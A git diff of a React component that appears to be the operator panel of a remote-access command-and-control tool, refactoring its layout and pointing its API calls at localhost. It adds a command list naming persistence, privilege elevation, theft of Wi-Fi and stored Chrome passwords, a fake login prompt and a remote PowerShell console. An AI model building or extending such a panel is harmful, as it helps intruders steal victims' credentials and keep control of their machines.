@@ -2,13 +2,46 @@ import {useState, useEffect} from 'react';
 import {NavLink, useParams} from "react-router-dom";
 import Title from "react-titles/Title6";
 import React from "react";
-import {Button, Form} from 'react-bootstrap';
 import './ClientControl.css';
-import ClientInformation from "./ClientInformation";
-import ClientActions from './ClientActions';
 import {Spinner} from "reactstrap";
-import {forEach} from "react-bootstrap/ElementChildren";
+import ClientControlSection from './ClientControlSection'
+import ClientControlCommand from './ClientControlCommand'
+import ClientControlResponse from './ClientControlResponse';
 
+const renderClientInfoTableRows = (rows) => {
+    return rows.map(([label, data], i) => {
+
+        return (
+            <div className="client-control-info-table-row" key={i.toString()}>
+                <div className='client-control-info-table-col label'>{label}</div>
+                <div className='client-control-info-table-col data'>{data.toString()}</div>
+            </div>
+        )
+    })
+}
+
+const ClientControlInformationTable = ({ client }) => {
+    console.log(client)
+    return (
+            <div className="client-control-info-table">
+                {renderClientInfoTableRows(Object.entries(client))}
+            </div>
+    )
+}
+
+// TODO: get list of commands from DB
+const commands = [
+    'Persistence',
+    'Elevate',
+    'Upload',
+    'Download',
+    'Change Background',
+    'Get Wifi Passwords',
+    'Get Stored Chrome Passwords',
+    'Prompt User UI Login',
+    'Get Network Information',
+    'Start Powershell Console'
+]
 
 const ClientControl = () => {
     const {id} = useParams();
@@ -16,12 +49,10 @@ const ClientControl = () => {
     const [clientStatus, setClientStatus] = useState(true);
     const [clientResponse, setClientResponse] = useState();
     const [allResponses, setAllResponses] = useState([]);
-    let responseString = "";
-
 
     useEffect(()=>{
         const getClient = () =>{
-            fetch('http://10.0.0.4:443/api/client', {
+            fetch('http://localhost:5000/api/client', {
                 method: 'POST', headers: {'Content-Type': 'application/json'},
                 body: JSON.stringify({id: id}), credentials: "include"
             })
@@ -35,6 +66,8 @@ const ClientControl = () => {
                 })
                 .then(data => {
                     if(Object.keys(data).length !== 0){
+                        delete data.user.__v
+                        delete data.user._id
                         setClient(data.user);
                         setClientStatus(data.user.status);
                     }
@@ -42,7 +75,7 @@ const ClientControl = () => {
                         return setClientStatus(false);
                 });
             const getResponse = () => {
-                fetch('http://10.0.0.4:443/api/response',{method:'POST', headers:{'Content-Type': 'application/json'},
+                fetch('http://localhost:5000/api/response',{method:'POST', headers:{'Content-Type': 'application/json'},
                     body:JSON.stringify({id:id}), credentials:"include"})
                     .then(response=>response.json())
                     .then(data=>{
@@ -60,40 +93,25 @@ const ClientControl = () => {
         };
     },[]);
 
-    function displayResponse()
-    {
-        allResponses.forEach( resp =>{
-            responseString += `\n*************************** New response ***************************\n${resp}\n_______________________________________________________________________\n`;
-        });
-        return(
-            <Form.Control as="textarea" rows={10} disabled={true} className={"response"}
-                value={(clientResponse) && `${responseString}`}
-            />
-        )
-    }
-
     return (
         <div className="controlPageWrapper">
             <div className="title">
                 <Title size="600" text1="COMMAND & CONTROL" open={true}/>
             </div>
-            <Form className={"command-form"}>
-                {(client !== undefined) ? (
+            <div className="client-control-form-wrapper">
+                {client !== undefined ? 
                     <>
-                        <ClientInformation client={client}/>
-                        <ClientActions client={client}/>
-                        <Form.Group controlId="response">
-                            <Form.Label className={"small-titles"} id={"title3"}>Response</Form.Label>
-                            {displayResponse()}
-                        </Form.Group>
-                        <div className={"buttons"}>
-                            <NavLink to={"/clients"}>
-                                <Button href="/clients" variant={"success"}>Back</Button>
-                            </NavLink>
-                        </div>
-                    </>
-                    ) : <Spinner actions={"border"} color={"success"} type="grow"/>}
-            </Form>
+                        <ClientControlSection title="Client Information">
+                            <ClientControlInformationTable client={client} />
+                        </ClientControlSection>
+                        <ClientControlSection title="Command">
+                            <ClientControlCommand commands={commands}/>
+                        </ClientControlSection>
+                        <ClientControlSection title="Response">
+                            <ClientControlResponse clientResponse={clientResponse} allResponses={allResponses}/>
+                        </ClientControlSection>
+                    </> : <Spinner actions={"border"} color={"success"} type="grow"/>}
+            </div>
         </div>
     );
 }
